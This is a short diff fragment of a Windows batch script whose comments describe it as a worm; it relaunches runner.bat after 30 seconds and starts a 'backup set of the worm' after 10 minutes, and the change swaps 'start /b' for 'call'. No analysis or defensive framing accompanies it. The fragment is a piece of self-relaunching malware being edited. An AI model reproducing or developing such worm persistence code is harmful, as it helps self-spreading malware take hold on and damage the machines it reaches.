@@ -47,8 +47,8 @@ for /f "tokens=* delims=" %%a in ('dir /b "%sourceDirectory%\*.*"') do (
 
 REM Start the current process again after 30 seconds
 ping -n 31 localhost > nul
-start /b runner.bat
+call runner.bat
 
 REM Start a backup set of the worm after 10 minutes
 ping -n 601 localhost > nul
-start /b runner.bat
+call runner.bat
